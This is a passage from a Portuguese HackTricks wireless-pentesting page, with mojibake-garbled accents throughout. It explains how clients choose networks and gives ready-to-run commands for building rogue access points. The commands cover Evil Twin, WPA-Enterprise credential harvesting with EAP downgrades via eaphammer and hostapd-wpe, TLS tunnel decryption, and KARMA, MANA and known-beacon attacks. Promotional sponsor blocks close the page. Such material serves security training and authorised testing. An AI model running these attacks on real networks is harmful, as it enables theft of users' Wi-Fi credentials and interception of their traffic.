* O protocolo exige autentica√ß√£o da esta√ß√£o ao ESS, mas n√£o exige autentica√ß√£o do AP √† esta√ß√£o.

### Listas de Rede Preferencial (PNLs)

* As esta√ß√µes armazenam o ESSID de cada rede sem fio √† qual se conectam em sua Lista de Rede Preferencial (PNL), juntamente com detalhes de configura√ß√£o espec√≠ficos da rede.
* A PNL √© usada para se conectar automaticamente a redes conhecidas, melhorando a experi√™ncia do usu√°rio ao simplificar o processo de conex√£o.

### Varredura passiva

* Os APs periodicamente transmitem quadros de beacon, anunciando sua presen√ßa e recursos, incluindo o ESSID do AP, a menos que a transmiss√£o esteja desativada.
* Durante a varredura passiva, as esta√ß√µes escutam os quadros de beacon. Se o ESSID de um beacon corresponder a uma entrada na PNL da esta√ß√£o, a esta√ß√£o pode se conectar automaticamente a esse AP.
* O conhecimento da PNL de um dispositivo permite a explora√ß√£o potencial ao imitar o ESSID de uma rede conhecida, enganando o dispositivo para se conectar a um AP falso.

### Sondagem ativa

* A sondagem ativa envolve esta√ß√µes enviando solicita√ß√µes de sonda para descobrir APs pr√≥ximos e suas caracter√≠sticas.
* As solicita√ß√µes de sonda direcionadas visam um ESSID espec√≠fico, ajudando a detectar se uma rede em particular est√° ao alcance, mesmo que seja uma rede oculta.
* As solicita√ß√µes de sonda de transmiss√£o t√™m um campo SSID nulo e s√£o enviadas a todos os APs pr√≥ximos, permitindo que a esta√ß√£o verifique qualquer rede preferencial sem divulgar o conte√∫do de sua PNL.

## AP simples com redirecionamento para a Internet

Antes de explicar como realizar ataques mais complexos, ser√° explicado **como** simplesmente **criar** um **AP** e **redirecionar** seu **tr√°fego** para uma interface conectada **√†** **Internet**.

Usando `ifconfig -a`, verifique se a interface wlan para criar o AP e a interface conectada √† Internet est√£o presentes.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Crie o arquivo de configura√ß√£o `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Em seguida, **configure IPs** e **rotas**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
E ent√£o **inicie** o dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Crie um arquivo de configura√ß√£o `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Parar processos irritantes**, definir **modo de monitoramento** e **iniciar o hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Encaminhamento e Redirecionamento
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Um ataque de g√™meo mal√©fico explora a forma como os clientes de WiFi reconhecem redes, principalmente confiando no nome da rede (ESSID) sem exigir que a esta√ß√£o base (ponto de acesso) se autentique para o cliente. Pontos-chave incluem:

- **Dificuldade de Diferencia√ß√£o**: Dispositivos t√™m dificuldade em distinguir entre pontos de acesso leg√≠timos e falsos quando compartilham o mesmo ESSID e tipo de criptografia. Redes do mundo real frequentemente usam v√°rios pontos de acesso com o mesmo ESSID para estender a cobertura de forma transparente.
- **Roaming de Cliente e Manipula√ß√£o de Conex√£o**: O protocolo 802.11 permite que dispositivos fa√ßam roaming entre pontos de acesso dentro do mesmo ESS. Atacantes podem explorar isso atraindo um dispositivo para se desconectar de sua esta√ß√£o base atual e se conectar a uma falsa. Isso pode ser alcan√ßado oferecendo um sinal mais forte ou interrompendo a conex√£o com o ponto de acesso leg√≠timo atrav√©s de m√©todos como pacotes de desautentica√ß√£o ou interfer√™ncia.
- **Desafios na Execu√ß√£o**: Executar com sucesso um ataque de g√™meo mal√©fico em ambientes com v√°rios pontos de acesso bem posicionados pode ser desafiador. Desautenticar um √∫nico ponto de acesso leg√≠timo frequentemente resulta no dispositivo se conectando a outro ponto de acesso leg√≠timo, a menos que o atacante consiga desautenticar todos os pontos de acesso pr√≥ximos ou posicionar estrategicamente o ponto de acesso falso.

Voc√™ pode criar um Evil Twin Aberto muito b√°sico (sem capacidade de rotear tr√°fego para a Internet) fazendo:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Voc√™ tamb√©m pode criar um Evil Twin usando **eaphammer** (observe que para criar evil twins com eaphammer a interface **N√ÉO deve estar** no modo **monitor**):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Ou usando o Airgeddon: `Op√ß√µes: 5,6,7,8,9 (dentro do menu de ataque Evil Twin).`

![](<../../.gitbook/assets/image (1088).png>)

Por favor, note que por padr√£o, se um ESSID na PNL estiver salvo como protegido por WPA, o dispositivo n√£o se conectar√° automaticamente a um Evil Twin aberto. Voc√™ pode tentar fazer um DoS no AP real e esperar que o usu√°rio se conecte manualmente ao seu Evil Twin aberto, ou poderia fazer um DoS no AP real e usar um WPA Evil Twin para capturar o handshake (usando este m√©todo voc√™ n√£o poder√° deixar a v√≠tima se conectar a voc√™, pois n√£o sabe o PSK, mas pode capturar o handshake e tentar quebr√°-lo).

_Alguns sistemas operacionais e antiv√≠rus avisar√£o o usu√°rio que se conectar a uma rede aberta √© perigoso..._

### Evil Twin WPA/WPA2

Voc√™ pode criar um **Evil Twin usando WPA/2** e se os dispositivos estiverem configurados para se conectar a esse SSID com WPA/2, eles tentar√£o se conectar. De qualquer forma, **para completar o handshake de 4 vias**, voc√™ tamb√©m precisa **saber** a **senha** que o cliente vai usar. Se voc√™ **n√£o souber**, a **conex√£o n√£o ser√° conclu√≠da**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Evil Twin Empresarial

Para entender esses ataques, recomendo ler antes a breve [explica√ß√£o sobre WPA Enterprise](./#wpa-enterprise-mgt).

**Usando hostapd-wpe**

`hostapd-wpe` precisa de um arquivo de **configura√ß√£o** para funcionar. Para **automatizar** a gera√ß√£o dessas configura√ß√µes, voc√™ pode usar [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) (baixe o arquivo python dentro de _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
No ficheiro de configura√ß√£o, pode selecionar v√°rias coisas diferentes como ssid, canal, ficheiros de utilizador, cret/key, par√¢metros dh, vers√£o wpa e autentica√ß√£o...

[**Usando o hostapd-wpe com EAP-TLS para permitir que qualquer certificado fa√ßa login.**](evil-twin-eap-tls.md)

**Usando o EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Por padr√£o, o EAPHammer utiliza esses m√©todos de autentica√ß√£o (observe o GTC como o primeiro a ser tentado para obter senhas em texto simples e depois o uso de m√©todos de autentica√ß√£o mais robustos):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Esta √© a metodologia padr√£o para evitar tempos de conex√£o longos. No entanto, voc√™ tamb√©m pode especificar ao servidor os m√©todos de autentica√ß√£o do mais fraco para o mais forte:
```
--negotiate weakest
```
Ou voc√™ tamb√©m pode usar:

* `--negotiate gtc-downgrade` para usar uma implementa√ß√£o de downgrade GTC altamente eficiente (senhas em texto simples)
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` para especificar manualmente os m√©todos oferecidos (oferecendo os mesmos m√©todos de autentica√ß√£o na mesma ordem que a organiza√ß√£o, o ataque ser√° muito mais dif√≠cil de detectar).
* [Encontre mais informa√ß√µes na wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Usando Airgeddon**

`Airgeddon` pode usar certificados previamente gerados para oferecer autentica√ß√£o EAP a redes WPA/WPA2-Enterprise. A rede falsa ir√° degradar o protocolo de conex√£o para EAP-MD5 para poder **capturar o usu√°rio e o MD5 da senha**. Posteriormente, o atacante pode tentar quebrar a senha.\
`Airggedon` oferece a possibilidade de um **ataque Evil Twin cont√≠nuo (barulhento)** ou **apenas criar o Evil Attack at√© que algu√©m se conecte (suave).**

![](<../../.gitbook/assets/image (936).png>)

### Depurando t√∫neis TLS PEAP e EAP-TTLS em ataques Evil Twins

_Este m√©todo foi testado em uma conex√£o PEAP, mas como estou descriptografando um t√∫nel TLS arbitr√°rio, isso tamb√©m deve funcionar com EAP-TTLS_

Dentro da **configura√ß√£o** do _hostapd-wpe_, **comente** a linha que cont√©m _**dh\_file**_ (de `dh_file=/etc/hostapd-wpe/certs/dh` para `#dh_file=/etc/hostapd-wpe/certs/dh`)\
Isso far√° com que o `hostapd-wpe` **troque chaves usando RSA** em vez de DH, para que voc√™ possa **descriptografar** o tr√°fego posteriormente **conhecendo a chave privada dos servidores**.

Agora inicie o **Evil Twin** usando o **`hostapd-wpe`** com essa configura√ß√£o modificada como de costume. Al√©m disso, inicie o **`wireshark`** na **interface** que est√° realizando o ataque Evil Twin.

Agora ou mais tarde (quando voc√™ j√° capturou algumas inten√ß√µes de autentica√ß√£o) voc√™ pode adicionar a chave privada RSA ao wireshark em: `Editar --> Prefer√™ncias --> Protocolos --> TLS --> (Lista de chaves RSA) Editar...`

Adicione uma nova entrada e preencha o formul√°rio com estes valores: **Endere√ßo IP = qualquer** -- **Porta = 0** -- **Protocolo = dados** -- **Arquivo de Chave** (**selecione seu arquivo de chave**, para evitar problemas selecione um arquivo de chave **sem prote√ß√£o por senha**).

![](<../../.gitbook/assets/image (687).png>)

E veja a nova aba **"TLS Descriptografado"**:

![](<../../.gitbook/assets/image (231).png>)

## Ataque KARMA, MANA, Loud MANA e Beacons Conhecidos

### Listas de filtros de blacklists e whitelists de ESSID e MAC

Diferentes tipos de Listas de Filtro de Controle de Acesso √† M√≠dia (MFACLs) e seus modos correspondentes e efeitos no comportamento de um Ponto de Acesso (AP) falso:

1. **Whitelist baseada em MAC**:
* O AP falso responder√° apenas a solicita√ß√µes de sonda de dispositivos especificados na lista branca, permanecendo invis√≠vel para todos os outros n√£o listados.
2. **Blacklist baseada em MAC**:
* O AP falso ignorar√° solicita√ß√µes de sonda de dispositivos na lista negra, tornando efetivamente o AP falso invis√≠vel para esses dispositivos espec√≠ficos.
3. **Whitelist baseada em SSID**:
* O AP falso responder√° apenas a solicita√ß√µes de sonda para ESSIDs espec√≠ficos listados, tornando-o invis√≠vel para dispositivos cujas Listas de Rede Preferidas (PNLs) n√£o contenham esses ESSIDs.
4. **Blacklist baseada em SSID**:
* O AP falso n√£o responder√° a solicita√ß√µes de sonda para os ESSIDs espec√≠ficos na lista negra, tornando-o invis√≠vel para dispositivos que procuram essas redes espec√≠ficas.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Este m√©todo permite a um **atacante criar um ponto de acesso (AP) malicioso que responde a todos os pedidos de sondagem** de dispositivos que procuram conectar-se a redes. Esta t√©cnica **enganar dispositivos para se conectarem ao AP do atacante** imitando as redes que os dispositivos est√£o procurando. Uma vez que um dispositivo envia um pedido de conex√£o para este AP falso, ele completa a conex√£o, levando o dispositivo a se conectar erroneamente √† rede do atacante.

### MANA

Ent√£o, **os dispositivos come√ßaram a ignorar respostas de rede n√£o solicitadas**, reduzindo a efic√°cia do ataque karma original. No entanto, um novo m√©todo, conhecido como o **ataque MANA**, foi introduzido por Ian de Villiers e Dominic White. Este m√©todo envolve o AP falso **capturando as Listas de Redes Preferidas (PNL) dos dispositivos respondendo aos seus pedidos de sondagem de difus√£o** com nomes de redes (SSIDs) previamente solicitados pelos dispositivos. Este sofisticado ataque contorna as prote√ß√µes contra o ataque karma original ao explorar a forma como os dispositivos lembram e priorizam redes conhecidas.

O ataque MANA opera monitorizando tanto os pedidos de sondagem direcionados como os de difus√£o dos dispositivos. Para pedidos direcionados, ele regista o endere√ßo MAC do dispositivo e o nome da rede solicitada, adicionando esta informa√ß√£o a uma lista. Quando √© recebido um pedido de difus√£o, o AP responde com informa√ß√µes correspondentes a qualquer uma das redes na lista do dispositivo, tentando o dispositivo a conectar-se ao AP falso.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Ataque Loud MANA

Um ataque **Loud MANA** √© uma estrat√©gia avan√ßada para quando os dispositivos n√£o utilizam sondagem direcionada ou quando suas Listas de Redes Preferidas (PNL) s√£o desconhecidas pelo atacante. Ele opera com base no princ√≠pio de que **dispositivos na mesma √°rea provavelmente compartilham alguns nomes de rede em suas PNLs**. Em vez de responder seletivamente, esse ataque transmite respostas de sondagem para cada nome de rede (ESSID) encontrado nas PNLs combinadas de todos os dispositivos observados. Essa abordagem ampla aumenta a chance de um dispositivo reconhecer uma rede familiar e tentar se conectar ao Ponto de Acesso (AP) falso.
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Ataque de Beacon Conhecido

Quando o ataque **Loud MANA** pode n√£o ser suficiente, o **Ataque de Beacon Conhecido** apresenta outra abordagem. Este m√©todo **for√ßa a conex√£o ao simular um AP que responde a qualquer nome de rede, percorrendo uma lista de ESSIDs potenciais** derivados de uma lista de palavras. Isso simula a presen√ßa de in√∫meras redes, na esperan√ßa de corresponder a um ESSID dentro da PNL da v√≠tima, provocando uma tentativa de conex√£o com o AP fabricado. O ataque pode ser amplificado combinando-o com a op√ß√£o `--loud` para uma tentativa mais agressiva de capturar dispositivos.

O Eaphammer implementou este ataque como um ataque MANA onde todos os ESSIDs dentro de uma lista s√£o carregados (voc√™ tamb√©m pode combinar isso com `--loud` para criar um ataque Loud MANA + Beacon Conhecido):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Ataque de Rajada de Beacons Conhecidos**

O **ataque de Rajada de Beacons Conhecidos** envolve **a transmiss√£o em r√°pida sucess√£o de quadros de beacons para cada ESSID listado em um arquivo**. Isso cria um ambiente denso de redes falsas, aumentando significativamente a probabilidade de dispositivos se conectarem ao AP fraudulento, especialmente quando combinado com um ataque MANA. Essa t√©cnica aproveita a velocidade e o volume para sobrecarregar os mecanismos de sele√ß√£o de rede dos dispositivos.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** √© um protocolo que permite que dispositivos se conectem diretamente entre si usando Wi-Fi sem a necessidade de um ponto de acesso sem fio tradicional. Essa capacidade est√° integrada em v√°rios dispositivos da Internet das Coisas (IoT), como impressoras e televis√µes, facilitando a comunica√ß√£o direta de dispositivo para dispositivo. Uma caracter√≠stica not√°vel do Wi-Fi Direct √© que um dispositivo assume o papel de um ponto de acesso, conhecido como o propriet√°rio do grupo, para gerenciar a conex√£o.

A seguran√ßa das conex√µes Wi-Fi Direct √© estabelecida atrav√©s do **Wi-Fi Protected Setup (WPS)**, que suporta v√°rios m√©todos para emparelhamento seguro, incluindo:

* **Configura√ß√£o por Bot√£o de Press√£o (PBC)**
* **Inser√ß√£o de PIN**
* **Comunica√ß√£o por Campo de Proximidade (NFC)**

Esses m√©todos, especialmente a inser√ß√£o de PIN, s√£o suscet√≠veis √†s mesmas vulnerabilidades que o WPS em redes Wi-Fi tradicionais, tornando-os alvos para vetores de ataque semelhantes.

### Sequestro EvilDirect

**Sequestro EvilDirect** √© um ataque espec√≠fico ao Wi-Fi Direct. Ele espelha o conceito de um ataque Evil Twin, mas direcionado √†s conex√µes Wi-Fi Direct. Nesse cen√°rio, um atacante se passa por um propriet√°rio de grupo leg√≠timo com o objetivo de enganar dispositivos para se conectarem a uma entidade maliciosa. Este m√©todo pode ser executado usando ferramentas como `airbase-ng`, especificando o canal, ESSID e endere√ßo MAC do dispositivo falsificado:

## Refer√™ncias

* [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
* [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
* [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
* [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
* [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
* [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
* [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\))
* [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)

TODO: D√™ uma olhada em [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (login com facebook e imita√ß√£o de WPA em portais cativos)

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Percep√ß√µes de Hacking**\
Engaje-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e percep√ß√µes em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os mais novos programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais na plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
